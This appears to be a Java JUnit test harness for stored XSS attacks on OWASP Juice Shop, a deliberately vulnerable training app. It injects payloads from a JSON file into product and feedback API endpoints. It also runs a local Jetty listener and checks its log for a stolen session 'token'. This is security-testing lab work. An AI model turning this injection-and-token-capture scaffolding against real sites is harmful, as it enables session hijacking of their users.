import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import org.eclipse.jetty.server.Handler;
import org.eclipse.jetty.server.NCSARequestLog;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.handler.*;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.junit.AfterClass;
import org.junit.Assert;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.*;

import java.util.Properties;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static io.restassured.RestAssured.given;

public class JuiceShopXSS {

    private static Server server;
    private static String payload;
    private static int timeToReload = 15000;

    @BeforeClass
    public static void startTestPageServer() throws Exception {
        server = new Server(5555);
        configureJettyLogging();
        server.start();
        loadProperties();
    }

    @AfterClass
    public static void stopTestPageServer() throws Exception {
        server.stop();
    }

    @Test
    public void xssTier3() {
        try {
            setPayload("xss.json","payloadXSS3");
            injectPayload("/api/Products/1");
            reloadPage();
            evaluateLogfile();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Test
    public void xssTier4(){
        try {
            setPayload("xss.json","payloadXSS4");
            injectPayload("/api/Feedbacks");
            reloadPage();
            evaluateLogfile();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void configureJettyLogging() {
        HandlerCollection handlers = new HandlerCollection();
        ContextHandlerCollection contexts = new ContextHandlerCollection();
        RequestLogHandler requestLogHandler = new RequestLogHandler();
        handlers.setHandlers(new Handler[]{contexts,new DefaultHandler(),requestLogHandler});
        server.setHandler(handlers);

        NCSARequestLog requestLog = new NCSARequestLog("logs/jetty-request.log");
        requestLog.setRetainDays(90);
        requestLog.setAppend(false);
        requestLog.setExtended(false);
        requestLog.setLogTimeZone("GMT");
        requestLogHandler.setRequestLog(requestLog);

        System.out.println(">>> configureJettyLogging done.");
    }

    private static void loadProperties() throws IOException {
        Properties properties = new Properties();

        try(InputStream stream = JuiceShopXSS.class.getClassLoader().getResourceAsStream("config.properties")){
            properties.load(stream);
        }

        // Load config
        RestAssured.baseURI = properties.getProperty("base-uri");
        RestAssured.port = Integer.parseInt(properties.getProperty("port"));
        RestAssured.basePath = properties.getProperty("base-path");

        if (!properties.getProperty("proxy_ip").equals("")) {
            RestAssured.proxy(properties.getProperty("proxy_ip"), Integer.parseInt(properties.getProperty("proxy_port")));
        }

        System.out.println(">>> Properties loaded.");

    }

    private static void setPayload(String file, String payloadName) {
            JSONParser jsonParser = new JSONParser();
        try {
            JSONObject jsonObj = (JSONObject) jsonParser.parse(new FileReader(JuiceShopXSS.class.getClassLoader().getResource("payloads/"+file).getFile()));
            payload = jsonObj.get(payloadName).toString();
            System.out.println(">>> Payload set: \""+payloadName+"\"");
        }
        catch (Exception e) {
            System.err.println(">>> Something went wrong reading the payload from the sourcefile.");
        }
    }

    private void injectPayload(String restPath) {

        String payload = this.payload;

        RestAssured.basePath = "";

        given().
                request().
                body(payload).
                contentType(ContentType.JSON).
                when().
                put(restPath).
                then().
                statusCode(200);

        System.out.println(">>> Payload placed in \""+restPath+"\"");

    }

    //TODO: Only a manual page reload runs the stored payload. Is there another possibility to refresh the page?
    private void reloadPage() {
        System.out.println(">>> Waiting "+timeToReload/1000+" seconds ...");

        try {
        Thread.sleep(timeToReload);
        } catch (Exception e) {
            e.printStackTrace();
        }

        System.out.println(">>> Continuing ...");
    }

    private void evaluateLogfile() throws IOException {
        BufferedReader bufRead = new BufferedReader(new FileReader("logs/jetty-request.log"));
        String line;

        if ((line = bufRead.readLine()) != null)
        {
            if (line.contains("token")) {
                System.out.println(">>> Success! Log contains token.");
                Pattern p = Pattern.compile("token=\\S*");
                Matcher m = p.matcher(line);
                m.find();
                System.out.println(">>> Token found: "+m.group(0));

            } else {
                System.out.println(">>> No token was found. Is a user logged in?");
            }
        } else {
            Assert.fail(">>> Jetty log seems to be empty ... \n- Did you refresh the page manually to execute the payload?\n" +
                    "- Did your browser connect via the proxy?");
        }
    }
}
